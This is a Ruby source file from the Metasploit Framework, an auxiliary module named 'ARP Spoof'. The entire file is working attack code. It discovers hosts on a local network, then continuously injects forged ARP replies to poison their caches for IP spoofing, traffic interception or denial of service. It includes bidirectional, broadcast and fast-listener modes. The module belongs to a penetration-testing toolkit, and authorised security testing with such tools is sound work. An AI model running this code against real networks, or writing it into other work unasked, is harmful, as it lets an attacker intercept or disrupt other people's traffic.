##
# $Id: arp_poisoning.rb 12564 2011-05-08 09:43:22Z amaloteaux $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Capture
	include Msf::Auxiliary::Report
	#include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'ARP Spoof',
			'Version'     => '$Revision: 12564 $',
			'Description' => %q{
				Spoof ARP replies and poison remote ARP caches to conduct IP address spoofing or a denial of service.
			},
			'Author'      => 	'amaloteaux', # msf rewrite
						#tons of people  ....
			'License'     => MSF_LICENSE,
			'References'     =>
				[
					['OSVDB', '11169'],
					['CVE', '1999-0667'],
					['URL', 'http://en.wikipedia.org/wiki/ARP_spoofing']
				],
			'DisclosureDate' => 'Dec 22 1999' #osvdb date
		)

		register_options([
			OptString.new('SHOSTS',  	[true, 'Spoofed ip addresses']),
			OptString.new('SMAC',    	[true, 'The spoofed mac']),
			OptString.new('DHOSTS',  	[true, 'Target ip addresses']),
			OptString.new('INTERFACE', 	[false, 'The name of the interface']),
			OptBool.new(  'BIDIRECTIONAL',	[true, 'Spoof also the source with the dest',false]),
			OptBool.new(  'VERBOSE',	[true, 'Display more output on screen',false]),
			OptBool.new(  'LISTENER',    	[true, 'Use an additionnal thread that will listen to arp request and try to relply as fast as possible', false]),
			# This mode will generate address ip conflict pop up  on most systems
			OptBool.new(  'BROADCAST',    	[true, 'If set, the module will send replies on the broadcast address witout consideration of DHOSTS', false])
		], self.class)

		register_advanced_options([
			OptString.new('LOCALSMAC',    	[false, 'The MAC address of the local interface to use for hosts detection']),
			OptString.new('LOCALSIP',    	[false, 'The IP address of the local interface to use for hosts detection']),
			OptInt.new(   'PKT_DELAY',    	[true, 'The delay in milliseconds between each packet during poisoning', 100]),
			OptInt.new('TIMEOUT', [true, 'The number of seconds to wait for new data', 2])
		], self.class)

		deregister_options('SNAPLEN', 'FILTER', 'PCAPFILE','RHOST','UDP_SECRET','GATEWAY','NETMASK')
	end

	def run
		begin
			open_pcap({'SNAPLEN' => 68, 'FILTER' => "arp[6:2] == 0x0002"})
			@interface = datastore['INTERFACE'] || Pcap.lookupdev

			@smac = datastore['SMAC'] 
			#raise RuntimeError ,'Source Mac should be defined' unless @smac
			raise RuntimeError ,'Source Mac is not in correct format' unless is_mac?(@smac)

			shosts_range  = Rex::Socket::RangeWalker.new(datastore['SHOSTS'])
			@shosts = []
			shosts_range.each{|shost| if is_ipv4? shost then @shosts.push shost end}
			
			if datastore['BROADCAST']
				broadcast_spoof
			else
				arp_poisoning
			end
			close_pcap()
		rescue
			print_error( $!.message)
		ensure
			if datastore['LISTENER']
				@listener.kill if @listener
				GC.start()
			end
			close_pcap()
		end
	end

	def broadcast_spoof
		print_status("ARP poisonning in progress (broadcast)...")
		while(true)
			@shosts.each do |shost|
				print_status("Sending arp packet for #{shost} address") if datastore['VERBOSE']
				reply = buildreply(shost, @smac, '0.0.0.0', 'ff:ff:ff:ff:ff:ff')
				capture.inject(reply)
				Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
			end
		end
	end

	def arp_poisoning
		# The local dst (and src) cache(s)
		dsthosts_cache = {}
		srchosts_cache = {}

		lsmac = datastore['LOCALSMAC'] || @smac
		raise RuntimeError ,'Local Source Mac is not in correct format' unless is_mac?(lsmac)

		sip = datastore['LOCALSIP'] || Pcap.lookupaddrs(@interface)[0]
		raise "LOCALIP is not an ipv4 address" unless is_ipv4? sip

		dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])
		dhosts = []
		dhosts_range.each{|dhost| if is_ipv4? dhost then dhosts.push(dhost) end} 

		#Build the local dest hosts cache
		print_status("Building the destination hosts cache...")
		dhosts.each do |dhost|
			if datastore['VERBOSE']
				print_status("Sending arp packet to #{dhost}")
			end
			probe = buildprobe(sip, lsmac, dhost)
			capture.inject(probe)
			while(reply = getreply())
				next if not reply[:arp]
				#Without this check any arp request would be added to the cache
				if dhosts.include? reply[:arp].spa
					print_status("#{reply[:arp].spa} appears to be up.") 
					report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
					dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
				end
			end
			
		end
		#Wait some few seconds for last packets
		etime = Time.now.to_f + datastore['TIMEOUT']
		while (Time.now.to_f < etime)
			while(reply = getreply())
				next if not reply[:arp]
				if dhosts.include? reply[:arp].spa
					print_status("#{reply[:arp].spa} appears to be up.")  
					report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
					dsthosts_cache[reply[:arp].spa] = reply[:arp].sha
				end
			end
			Kernel.select(nil, nil, nil, 0.50)
		end
		raise RuntimeError, "No hosts found" unless dsthosts_cache.length > 0

		#Build the local src hosts cache
		if datastore['BIDIRECTIONAL']
			print_status("Building the source hosts cache for unknow source hosts...")
			@shosts.each do |shost|
				if dsthosts_cache.has_key? shost
					if datastore['VERBOSE']
						print_status("Adding #{shost} from destination cache")
					end		
					srchosts_cache[shost] = dsthosts_cache[shost]
					next
				end
				if datastore['VERBOSE']
					print_status("Sending arp packet to #{shost}")
				end
				probe = buildprobe(sip, lsmac, shost)
				capture.inject(probe)
				while(reply = getreply())
					next if not reply[:arp]
					if @shosts.include? reply[:arp].spa
						print_status("#{reply[:arp].spa} appears to be up.") 
						report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
						srchosts_cache[reply[:arp].spa] = reply[:arp].sha
					end
				end
			
			end
			#Wait some few seconds for last packets
			etime = Time.now.to_f + datastore['TIMEOUT']
			while (Time.now.to_f < etime)
				while(reply = getreply())
					next if not reply[:arp]
					if @shosts.include? reply[:arp].spa
						print_status("#{reply[:arp].spa} appears to be up.")  
						report_host(:host => reply[:arp].spa, :mac=>reply[:arp].sha)
						srchosts_cache[reply[:arp].spa] = reply[:arp].sha
					end
				end
				Kernel.select(nil, nil, nil, 0.50)
			end
			raise RuntimeError, "No hosts found" unless srchosts_cache.length > 0
		end

		#Start the listener
		if datastore['LISTENER']
			start_listener(dsthosts_cache, srchosts_cache)
		end
		#Do the job until user interupt it
		print_status("ARP poisonning in progress...")
		while(true)
			dsthosts_cache.each do |dhost, dmac|
				if datastore['BIDIRECTIONAL']
					srchosts_cache.each do |shost,smac|
						if shost != dhost
							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
							reply = buildreply(shost, @smac, dhost, dmac)
							capture.inject(reply)
							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
						end
					end
				else
					@shosts.each do |shost|
						if shost != dhost
							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
							reply = buildreply(shost, @smac, dhost, dmac)
							capture.inject(reply)
							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
						end
					end
				end
			end

			if datastore['BIDIRECTIONAL']
				srchosts_cache.each do |shost, smac|
					dsthosts_cache.each do |dhost,dmac|
						if shost != dhost
							print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
							reply = buildreply(dhost, @smac, shost, smac)
							capture.inject(reply)
							Kernel.select(nil, nil, nil, (datastore['PKT_DELAY'] * 1.0 )/1000)
						end
					end
				end
			end

		end
	end


	def is_mac?(mac)
		if mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/ then true
		else false end
	end

	#copy paste from rex::socket cause we need only ipv4
	def is_ipv4?(addr)
		(addr =~ /^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[.](?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2}))$/) ? true : false
	end

	def buildprobe(shost, smac, dhost)
		n = Racket::Racket.new
		n.l2 = Racket::L2::Ethernet.new(Racket::Misc.randstring(14))
		n.l2.src_mac = smac
		n.l2.dst_mac = 'ff:ff:ff:ff:ff:ff'
		n.l2.ethertype = 0x0806

		n.l3 = Racket::L3::ARP.new
		n.l3.opcode = Racket::L3::ARP::ARPOP_REQUEST
		n.l3.sha = n.l2.src_mac
		n.l3.tha = n.l2.dst_mac
		n.l3.spa = shost
		n.l3.tpa = dhost
		n.pack
	end

	def buildreply(shost, smac, dhost, dmac)
		n = Racket::Racket.new
		n.l2 = Racket::L2::Ethernet.new(Racket::Misc.randstring(14))
		n.l2.src_mac = smac
		n.l2.dst_mac = dmac
		n.l2.ethertype = 0x0806

		n.l3 = Racket::L3::ARP.new
		n.l3.opcode = Racket::L3::ARP::ARPOP_REPLY
		n.l3.sha = n.l2.src_mac
		n.l3.tha = n.l2.dst_mac
		n.l3.spa = shost
		n.l3.tpa = dhost
		n.pack
	end

	def getreply
		pkt = capture.next
		return if not pkt

		eth = Racket::L2::Ethernet.new(pkt)
		return if not eth.ethertype == 0x0806

		arp = Racket::L3::ARP.new(eth.payload)
		return if not arp.opcode == Racket::L3::ARP::ARPOP_REPLY

		{:raw => pkt, :eth => eth, :arp => arp}
	end
	
	def start_listener(dsthosts_cache, srchosts_cache)

		if datastore['BIDIRECTIONAL']
			args = {:BIDIRECTIONAL => true,  :dhosts => dsthosts_cache.dup, :shosts => srchosts_cache.dup}
		else
			args = {:BIDIRECTIONAL => false, :dhosts => dsthosts_cache.dup, :shosts => @shosts.dup}
		end
		@listener = 	
		Thread.new(args) do |args|
			begin
				#one more local copy 
				liste_src_ips = []
				if args[:BIDIRECTIONAL]
					args[:shosts].each_key {|address| liste_src_ips.push address}
				else
					args[:shosts].each {|address| liste_src_ips.push address}
				end
				liste_dst_ips = []	
				args[:dhosts].each_key {|address| liste_dst_ips.push address}	

				listener_capture = ::Pcap.open_live(@interface, 68, true, 0)
				listener_capture.setfilter("arp[6:2] == 0x0001")
				while(true)
					pkt = listener_capture.next
					if pkt
						eth = Racket::L2::Ethernet.new(pkt)
						if eth.ethertype == 0x0806
							arp = Racket::L3::ARP.new(eth.payload)
							if arp.opcode == Racket::L3::ARP::ARPOP_REQUEST
								#check if the source ip is in the dest hosts
								if (liste_dst_ips.include? arp.spa and liste_src_ips.include? arp.tpa) or
								   (args[:BIDIRECTIONAL] and liste_dst_ips.include? arp.tpa and liste_src_ips.include? arp.spa)
									print_status("Listener : Request from #{arp.spa} for #{arp.tpa}") if datastore['VERBOSE']
									reply = buildreply(arp.tpa, @smac, arp.spa, arp.sha)
									3.times{listener_capture.inject(reply)}
								end
							end
						end
					end
				end
			rescue => ex
				print_error("Listener Error: #{ex.message}")
				print_error("Listener Error: Listener is stopped")
			end
		end
		@listener.abort_on_exception = true
		#@listener.join
	end

end
